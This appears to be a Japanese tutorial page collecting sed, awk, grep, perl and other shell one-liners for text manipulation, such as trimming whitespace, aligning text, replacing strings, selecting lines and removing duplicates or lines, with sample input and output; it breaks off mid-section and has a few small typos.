This This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
bash-3.2$
```


## 改行や空白の操作
### tr 改行をスペースに変換します。
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.  
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | tr -d '\n'
This book is suitable for classroom use as a general introduction to programming concepts.This document is herewith granted to the Public Domain. No copyright!bash-3.2$
```


### tr CRLF を LF 形式に変換します。
行末にCRLF形式の改行「」が入っているテキスト。
「」は、Ctrl＋VとCtrl＋Mで入力できます。

``` :CRLF.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat CRLF.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat CRLF.txt | tr -d '\r'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### awk 各行の終わりから末尾の空白 (スペース、タブ) を削除します。
``` ENDTAB.txt
This book is suitable for classroom use as a general introduction to programming concepts.[TAB]
This document is herewith granted to the Public Domain. No copyright![TAB] 
```

```
bash-3.2$ cat ENDTAB.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat ENDTAB.txt | awk '{sub(/[ \t]+$/,"")};1'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### sed 各行から先頭と末尾の両方の空白を削除します。
``` :space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.   
   This document is herewith granted to the Public Domain. No copyright!   
```

```
bash-3.2$ cat space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.
   This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat space.txt | sed 's/^[ \t]*//;s/[ \t]*$//'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### awk 各行から先頭と末尾の両方の空白を削除します。
``` :space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.   
   This document is herewith granted to the Public Domain. No copyright!   
```

```
bash-3.2$ cat space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.
   This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat space.txt | awk '{gsub(/^[ \t]+|[ \t]+$/,"")};1'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### awk 各行から先頭と末尾の両方の空白を削除します。
``` :space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.   
   This document is herewith granted to the Public Domain. No copyright!   
```

```
bash-3.2$ cat space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.
   This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat space.txt | awk '{$1=$1};1'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### sed 各行の終わりから末尾の空白 (スペース、タブ) を削除します。
``` ENDTAB.txt
This book is suitable for classroom use as a general introduction to programming concepts.[TAB]
This document is herewith granted to the Public Domain. No copyright![TAB] 
```

```
bash-3.2$ cat ENDTAB.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat ENDTAB.txt | sed 's/[ \t]*$//'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### sed 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -e 's/^/     /g'
     This book is suitable for classroom use as a general introduction to programming concepts.
     This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### awk 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | awk '{sub(/^/,"     ")};1'
     This book is suitable for classroom use as a general introduction to programming concepts.
     This document is herewith granted to the Public Domain. No copyright!
bash-3.2$

```

### sed ２行間の改行を削除

``` :newline.txt
currentLine
nextLine
```

```
$ cat newline.xt | sed ':a;N;$!ba;s/\n//g'
$ currentLinenextLine
$ 
```




## 水平位置の揃え方
### sed 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。
``` :TAB.txt
  This book is suitable for classroom use as a general introduction to programming concepts.
  This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat TAB.txt
  This book is suitable for classroom use as a general introduction to programming concepts.
  This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat TAB.txt | sed 's/^[ \t]*//'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### awk 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。
``` :TAB.txt
  This book is suitable for classroom use as a general introduction to programming concepts.
  This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat TAB.txt
  This book is suitable for classroom use as a general introduction to programming concepts.
  This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat TAB.txt | awk'{sub(/^[ \t]+/,"")};1'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```

### sed テキストを列幅79で右揃えにします。
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -e :a -e 's/^.\{1,78\}$/ &/;ta'
This book is suitable for classroom use as a general introduction to programming concepts.
          This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### awk テキストを列幅79で右揃えにします。
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | awk '{printf "%79s\n",$0}'
This book is suitable for classroom use as a general introduction to programming concepts.
          This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### sed テキストを列幅79で中央揃えにします。
すべてのテキストを 79 列幅の中央に配置します。
sed 方法１では、行頭のスペースが重要であり、後続のスペースは行末に追加されます。
sed 方法２では、行の先頭にあるスペースは行の中央揃えで破棄され、行末に末尾のスペースは表示されません。

``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

sed 方法１
```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -e :a -e 's/^.\{1,77\}$/ &/;ta'
This book is suitable for classroom use as a general introduction to programming concepts.
         This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```

sed 方法２
```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -e :a -e 's/^.\{1,77\}$/ &/;ta' -e 's/\( *\)\1/\1/'
This book is suitable for classroom use as a general introduction to programming concepts.
     This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


### awk テキストを列幅79で中央揃えにします。
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

``` 
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | awk '{l=length();s=int((79-l)/2);printf "%"(s+l)"s\n",$0}'
This book is suitable for classroom use as a general introduction to programming concepts.
     This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


## 検索と置換
### sed bazを含む行のfooをbarに置き換えます。
```
sed '/baz/s/foo/bar/g'
```

### awk bazを含む行のfooをbarに置き換えます。
```
awk '/baz/{gsub(/foo/, "bar")}; 1'
```


### sed bazを除く行のfooをbarに置き換えます。
```
sed '/baz/!s/foo/bar/g'
```

### awk bazを除く行のfooをbarに置き換えます。
```
awk '!/baz/{gsub(/foo/, "bar")}; 1'
```

### sed scarletまたはrubyまたはpuceをredに変更します。
``` 
sed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g'
``` 

### gsed scarletまたはrubyまたはpuceをredに変更します。
``` 
gsed 's/scarlet\|ruby\|puce/red/g'
``` 

### awk scarletまたはrubyまたはpuceをredに変更します。
``` 
awk '{gsub(/scarlet|ruby|puce/, "red")}; 1'
```

### sed 文中の最初のfooだけをbarに置換
``` 
sed 's/foo/bar/'                      
```

### awk 文中の最初のfooだけをbarに置換
```
awk '{sub(/foo/,"bar")}; 1'           
```

### sed 文中の４つ目のfooだけをbarに置換
```
sed 's/foo/bar/4'                     
```

### awk 文中の４つ目のfooだけをbarに置換
```
gawk '{$0=gensub(/foo/,"bar",4)}; 1'  
```

### sed 文中のすべてのfooをbarに置換
```
sed 's/foo/bar/g'                     
```

### awk 文中のすべてのfooをbarに置換
```
awk '{gsub(/foo/,"bar")}; 1'          
```

### sed 文中にある複数のfooの最後から二つ目のみをbarに置換
``` :foobar.txt
foo foo foo foo foo
```

```
bash-3.2$ cat foobar.txt
foo foo foo foo foo
bash-3.2$ cat foobar.txt | sed 's/\(.*\)foo\(.*foo\)/\1bar\2/'
foo foo foo bar foo
bash-3.2$
```

### sed 文中にある複数のfooの最後のfooだけをbarに置換
``` :foobar.txt
foo foo foo foo foo
```

```
bash-3.2$ cat foobar.txt
foo foo foo foo foo
bash-3.2$ cat foobar.txt | sed 's/\(.*\)foo/\1bar/'
foo foo foo foo bar
bash-3.2$
```




## 行や段落の操作
### tac 行の逆順（catの逆）
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | tac
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
```

### sed 行の逆順（catの逆）
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed '1!G;h;$!d'
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
```

### sed 行の逆順（catの逆）
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -n '1!G;h;$p'
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
```


### awk 行の逆順（catの逆）
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt |awk '{a[i++]=$0} END {for (j=i-1; j>=0;) print a[j--] }'
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
```


### perl 行の逆順（catの逆）
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | perl -e 'print reverse <>'
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
```



### rev 行の各文字を反転します。
``` :hello.txt
Hello, world.
```

```
bash-3.2$ cat hello.txt
Hello, world.
bash-3.2$ cat hello.txt | rev
.dlrow ,olleH
bash-3.2$
```


### sed 行の各文字を反転します。
``` :hello.txt
Hello, world.
```

```
bash-3.2$ cat hello.txt
Hello, world.
bash-3.2$ cat hello.txt | sed '/\n/!G;s/\(.\)\(.*\n\)/&\2\1/;//D;s/.//'
.dlrow ,olleH
bash-3.2$
```


### perl 行の各文字を反転します。
``` :hello.txt
Hello, world.
```

```
bash-3.2$ cat hello.txt
Hello, world.
bash-3.2$ cat hello.txt | sed '/\n/!G;s/\(.\)\(.*\n\)/&\2\1/;//D;s/.//'
.dlrow ,olleH
bash-3.2$ cat hello.txt | perl -nle 'print scalar reverse $_'
.dlrow ,olleH
bash-3.2$
```

### sed 行を水平方向に結合
``` :hello03.txt
Hello, world.
Welcome to Japan.
```

```
bash-3.2$ cat hello03.txt
Hello, world.
Welcome to Japan.
bash-3.2$ cat hello03.txt | sed '$!N;s/\n/ /'
Hello, world. Welcome to Japan.
bash-3.2$
```

### gsed 5行ごとに空白行を追加(5、10、15、20 行などの後)
``` :doc04.txt
Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper
<thegrendel.abs@gmail.com>
10
10 Mar 2014
Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
'TUNGSTENBERRY' release
Revision 6.6    27 Nov 2012    Revised by: mc
'YTTERBIUMBERRY' release
Revision 10    10 Mar 2014    Revised by: mc
'PUBLICDOMAIN' release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc04.txt | gsed '0~5G'
Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper
<thegrendel.abs@gmail.com>
10

10 Mar 2014
Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
'TUNGSTENBERRY' release
Revision 6.6    27 Nov 2012    Revised by: mc

'YTTERBIUMBERRY' release
Revision 10    10 Mar 2014    Revised by: mc
'PUBLICDOMAIN' release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
This book is suitable for classroom use as a general introduction to programming concepts.

This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```

### sed 5行ごとに空白行を追加(5、10、15、20 行などの後)
``` :doc04.txt
Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper
<thegrendel.abs@gmail.com>
10
10 Mar 2014
Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
'TUNGSTENBERRY' release
Revision 6.6    27 Nov 2012    Revised by: mc
'YTTERBIUMBERRY' release
Revision 10    10 Mar 2014    Revised by: mc
'PUBLICDOMAIN' release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc04.txt | sed 'n;n;n;n;G;'
Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper
<thegrendel.abs@gmail.com>
10

10 Mar 2014
Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
'TUNGSTENBERRY' release
Revision 6.6    27 Nov 2012    Revised by: mc

'YTTERBIUMBERRY' release
Revision 10    10 Mar 2014    Revised by: mc
'PUBLICDOMAIN' release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
This book is suitable for classroom use as a general introduction to programming concepts.

This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


## ファイル操作
### rename すべてのファイルの名前を変更します
 (たとえば、すべての .gz ファイルから ABC を削除します)。
``` bash
rename 's/ABC//' *.gz
```

### rename すべてのファイルにファイル拡張子を追加します (例: .txt を追加)
``` bash
rename s/$/.txt/ *
```


## 数値のカンマ区切り
### gsed 数値文字列に３桁区切りを付与
```
bash-3.2$ echo "12345678910" | gsed ':a;s/\B[0-9]\{3\}\>/,&/;ta'
12,345,678,910
bash-3.2$
```


### gsed 数値文字列に３桁区切りを付与
```
bash-3.2$ echo "12345678910" |sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta'
12,345,678,910
bash-3.2$
```


### sed 小数点とマイナス記号を含む数値にカンマを追加
```
bash-3.2$ echo "1234.56 -789.10" |sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta'
1,234.56 -789.10
bash-3.2$
```


## フィールド操作
### paste ファイルの行を並べて結合
``` :hello.txt
Hello, world.
```

``` :hello02.txt
Welcome to Japan.
```

```
bash-3.2$ cat hello.txt
Hello, world.
bash-3.2$ cat hello02.txt
Welcome to Japan.
bash-3.2$ paste hello.txt hello02.txt
Hello, world.    Welcome to Japan.
bash-3.2$
```

### paste 2つ以上のファイルを列に結合/貼り付けます (例: fileA、fileB、fileC)
``` bash
paste fileA fileB fileC
```


### awk ２つのフィールドを逆順で出力
``` 
bash-3.2$ echo "world." "Hello, " | awk '{ print $2, $1;}'
Hello, world.
bash-3.2$
```


### awk ２つのフィールドを逆順で出力
```
bash-3.2$ echo "Hello," "world." | awk '{for (i=NF; i>0; i--) printf("%s ",$i);print ""}'
world. Hello,
bash-3.2$
```


```
bash-3.2$ echo "world." "Hello, " | awk '{tmp=$1;$1=$2;$2=tmp;}END{print}'
Hello, world.
bash-3.2$
```

### awk 列にコンマがあるかどうかを確認します (例: 列 $1)
``` bash
awk '$1~/,/ {print}' 
```


### cut ２列目以降を出力
```
bash-3.2$ echo "Hello," "world." | cut -d' ' -f2-
world.
```


### awk ２列目以降を出力
```
bash-3.2$ echo "Hello," "world." | awk '{$1="";}END{print;}'
 world.
bash-3.2$
```


### awk フィールド間にコンマ区切りを使用して、5 行ごとに入力を連結します。
``` bash
awk 'ORS=NR%5?",":"\n"'
```


### perl 各ファイル名の文字列の名前の部分aaaをbbbに変更します。
``` bash
ls | perl -ne 'chomp; next unless -e; $o = $_; s/aaa/bbb/; next if -e; rename $o, $_';
```

### join 2 つのファイルをフィールドごとにタブで結合
(デフォルトでは両方のファイルの最初の列で結合し、デフォルトのセパレータはスペースです)
``` bash
join -t '\t' fileA fileB
```

### join 指定したフィールドを使用して結合
（例：fileAの３列目とfileBの５列目を結合）
``` bash
join -1 3 -2 5 fileA fileB
```


### rev cut ファイルの最後の列を切り取って取得する
``` bash
cat file|rev | cut -d/ -f1 | rev
```

### rev cut 最後の列を切り取る
``` bash
cat filename|rev|cut -f1|rev
```

### awk 列の先頭に文字列を追加します (たとえば、列 $3 に「chr」を追加します)。
``` bash
awk 'BEGIN{OFS="\t"}$3="chr"$3'
```

### awk 最後の列を削除
``` bash
awk 'NF{NF-=1};1' file
```


## 条件出力
### head sed awk 最初の 10 行を出力
``` bash
head
head -n10
sed 10q
awk 'NR < 11'
```

### awk 文字列を含む行出力しない (例: 'bbo')
``` bash
cat file | awk '!/bbo/'
```


### head sed awk 最初の行を印刷:
```bash
head -1
sed q
awk 'NR>1{exit};1'
```


### tail sed 最後の 10 行を出力
``` bash
tail
tail -n10
sed -e :a -e '$q;N;11,$D;ba'
```


### tail sed awk 最後の 2 行を出力
``` bash
tail -2
sed '$!N;$!D'
awk '{y=x "\n" $0; x=$0};END{print y}'
```


### tail sed awk 最後の行を出力
``` bash 
tail -1
sed '$!d'
sed -n '$p'
awk 'END{print}'
```


### sed 最終行の次の行を出力
``` bash
sed -e '$!{h;d;}' -e x              # for 1-line, print blank line
sed -e '1{$q;}' -e '$!{h;d;}' -e x  # for 1-line, print the line
sed -e '1{$d;}' -e '$!{h;d;}' -e x  # for 1-line, print nothing
```


### sed 最後に列を追加
``` bash
for i in $(ls);do sed -i "s/$/\t$i/" $i;done
```



## 条件検索・正規表現
### grep sed awk 正規表現に一致する行のみを出力
``` bash
grep 'regex'
sed -n '/regex/p'           # method 1
sed '/regex/!d'             # method 2
awk '/regex/'
```


### grep sed awk 正規表現に一致しない行のみを出力:
``` bash
grep -v regex
sed -n '/regex/!p'          # method 1, corresponds to above
sed '/regex/d'              # method 2, simpler syntax
awk '!/regex/'
```

### grep 空行をカウントする
``` bash
cat filename.txt | grep -c "^$"
```

または、

``` bash
cat filename.txt | grep "^$" | wc -l
```

{{% tips-list tips %}}
ヒント
: `wc -l`は、行数をカウントする`wc`コマンドです。
: `^$`の `^` は行頭、 `$`は行末、いわゆる行頭と行末の間になにもない、それは空白行と意味します。
: 空白行を`wc -l`でカウントするということになります。

{{% /tips-list %}}

### grep 単語とマッチしない行を表示 (例: 'bbo')

``` bash
cat filename.txt | grep -v bbo
```

{{% tips-list tips %}}
ヒント
: `-v`は、「ではない（マッチしない）」という意味になります。
{{% /tips-list %}}


### grep 一致する行番号を返す 検索文字列は(例: 'bbo')

``` bash
cat filename.txt | grep -c bbo
```

### grep 特定の文字列で始まらない行を表示 (例: #)

``` bash
cat filename.txt | grep -v '^#'
```

{{% tips-list tips %}}
ヒント
: `^`は行頭という意味です。
{{% /tips-list %}}


### grep 大文字と小文字を区別しない grep (例: 'bbo'/'BBO'/'Bbo')

``` bash
cat filename.txt | grep -i "bbo"
```


### grep マッチに色を付けます (例: 'bbo')!

``` bash
cat filename.txt | grep --color bbo
```


### sed 特定の行を出力 (例: 123 行目)
``` bash
sed -n -e '123p'
```

### sed 行数を出力します (例: 10 行目から 33 行目)

``` bash
cat filename | sed -n '10,33p'
```


### sed n行ごとに出力する

``` bash
cat filename | sed -n '0~3p' 
```

### sed 奇数行ごとに出力

``` bash
cat filename | sed -n '1~2p'
```

### sed 最初の行を含めて 3 行ごとに出力する

``` bash
cat filename | sed -n '1p;0~3p'
```


### sed awk 正規表現の直前の行を出力
正規表現を含む行は出力しません:
``` bash
sed -n '/regex/{g;1!p;};h'
awk '/regex/{print x};{x=$0}'
awk '/regex/{print (NR==1 ? "match on line 1" : x)};{x=$0}'
```


### sed awk 正規表現の直後の行を出力
正規表現を含む行は出力しません:
``` bash
sed -n '/regex/{n;p;}'
awk '/regex/{getline;print}'
```


### grep sed 正規表現の前後１行のコンテキストを行番号付きで出力
``` bash
grep -A1 -B1 -n regex
sed -n -e '/regex/{=;x;1!p;g;$!N;p;D;}' -e h
```


### sed awk AAA と BBB と CCC を検索します (任意の順序で):
``` bash
sed '/AAA/!d; /BBB/!d; /CCC/!d'
awk '/AAA/ && /BBB/ && /CCC/'
```


### sed awk AAA、BBB、CCC(この順序で)を含む行を検索します。
``` bash
sed '/AAA.*BBB.*CCC/!d'
awk '/AAA.*BBB.*CCC/'
```


### egrep grep sed AAA、BBBまたはCCCを検索します。
``` bash
egrep "AAA|BBB|CCC"
grep -E "AAA|BBB|CCC"
sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d    # most seds
gsed '/AAA\|BBB\|CCC/!d'                        # GNU sed only
```


### sed AAAが含まれている段落を出力
(空白行で段落を区切ります):
``` bash
sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;'
```


### sed 段落AAAに BBBとCCC(任意の順序で)が含まれている段落を出力
``` bash
sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;/BBB/!d;/CCC/!d'
```


### sed gsed AAA、BBBまたはCCCが含まれている段落を出力
``` bash
sed -e '/./{H;$!d;}' -e 'x;/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d
gsed '/./{H;$!d;};x;/AAA\|BBB\|CCC/b;d'
```


### sed awk 65 文字以上の行を出力
``` bash
sed -n '/^.\{65\}/p'
awk 'length > 64'
```


### sed awk 65 文字未満の行のみを出力
``` bash
sed -n '/^.\{65\}/!p'        # method 1, corresponds to above
sed '/^.\{65\}/d'            # method 2, simpler syntax
awk 'length < 65'
```


### sed awk 正規表現から最後までのセクションを出力
``` bash
sed -n '/regex/,$p'
awk '/regex/,0'
awk '/regex/,EOF'
```


### sed awk perl 行番号に基づいてセクションを出力
(8 行目から 12 行目まで):
``` bash
sed -n '8,12p'
sed '8,12!d'
awk 'NR==8,NR==12'
perl -ne 'print if 8 .. 12'
perl -pe 'exit if 8<$. && $.<12'
```


### sed awk 行番号 52 を出力
``` bash
sed -n '52p'
sed '52!d'
sed '52q;d'
awk 'NR==52'
awk 'NR==52 {print;exit}'
```


### gsed sed ３行目から ７行ごとに出力
``` bash
gsed -n '3~7p'
sed -n '3,${p;n;n;n;n;n;n;}'
```


### sed awk perl 2 つの正規表現の間のセクションを出力
``` bash
sed -n '/START/,/END/p'
awk '/START/,/END/'
perl -ne 'print if /START/ .. /END/'
perl -ne 'print if m{START} .. m{END}'
```


### sed perl 2 つの正規表現の間のセクションを除くすべてを出力
``` bash
sed '/START/,/END/d'
perl -i.old -ne 'print unless /START/ .. /END/'
```


### awk フィールドを正規表現と照合
``` bash
awk '$7  ~ /^[a-f]/'
awk '$7 !~ /^[a-f]/'
```


### awk ５番目のフィールドが条件にあっていれば出力
``` bash
awk '$5 == "abc123"'
```


### awk ５番目のフィールドが条件にあっていなければ出力
``` bash
awk '$5 != "abc123"'
awk '!($5 == "abc123")'
```


## 重複の扱い
### uniq sed awk 重複する連続した行を削除します。
一連の重複行の最初の行は保持され、残りは削除されます。
``` bash
uniq
sed '$!N; /^\(.*\)\n\1$/!P; D'
awk 'a !~ $0; {a=$0}'
```


### sed awk 重複が連続していない行を削除
``` bash
sed -n 'G; s/\n/&&/; /^\([ -~]*\n\).*\n\1/d; s/\n//; h; P'
awk '!a[$0]++'
awk '!($0 in a){a[$0];print}'
```


### uniq sed 重複する行を除くすべての行を削除
``` bash
uniq -d
sed '$!N; s/^\(.*\)\n\1$/\1/; t; D'
```


## 行削除
### tail awk 最初の行を削除
``` bash
tail -n +2
awk 'NR > 1'
```


### sed awk perl 最初の 10 行を削除
``` bash
sed '1,10d'
awk 'NR > 10'
perl -ne 'print unless 1 .. 10'
```


### awk sed 5 行目を削除
``` bash
awk 'NR != 5'
sed '5d'
```


### awk sed 5から10 といった範囲の行を削除
``` bash
awk 'NR < 5 || NR > 10'
sed '5,10d'
```


### sed 最後の行を削除します。
``` bash
sed '$d'
```


### sed 最後の 2 行を削除します
``` bash
sed 'N;$!P;$!D;$d'
```


### sed 最後の 10 行を削除します。
``` bash
sed -e :a -e '$d;N;2,10ba' -e 'P;D'   
sed -n -e :a -e '1,10!{P;N;D;};N;ba' 
```


### gsed sed 8 行ごとに削除します
``` bash
gsed '0~8d'                           
sed 'n;n;n;n;n;n;n;d;'                
```


### sed パターンに一致する行を削除
``` bash
sed '/pattern/d'
```


### grep sed awk 空行をすべて削除
``` bash
grep '.'
sed '/^$/d'                           
sed '/./!d'                          
awk NF
awk '/./'
```


### cat sed 最初の空白行を除く連続する空白行を削除し、先頭と末尾のすべての空白行も削除
``` bash
cat -s
# method 1, allows 0 blanks at top, 1 at EOF
sed '/./,/^$/!d'   
# method 2, allows 1 blank at top, 0 at EOF
sed '/^$/N;/\n$/D' 
```


### sed 最初の 2 行を除く連続する空白行をすべて削除
``` bash
sed '/^$/N;/\n$/N;//D'
```


### sed 先頭の空白行をすべて削除
``` bash
sed '/./,$!d'
```


### sed 末尾の空白行をすべて削除
``` bash
sed -e :a -e '/^\n*$/{$d;N;ba' -e '}'
sed -e :a -e '/^\n*$/N;/\n$/ba'
```


### sed 各段落の最後の行を削除
``` bash
sed -n '/^$/{p;h;};/./{x;/./p;}'
```

### sed 文字列を含む行を削除 (例: 'bbo')

``` bash
cat filename | sed '/bbo/d'
```

### sed 1行目を削除

``` bash
cat filename | sed 1d 
```

### sed 最初の１００行（１行目から１００行目まで）を削除

``` bash
cat filename | sed 1,100d 
```


### sed 文字列を含む行を削除 (例: 'bbo')

``` bash
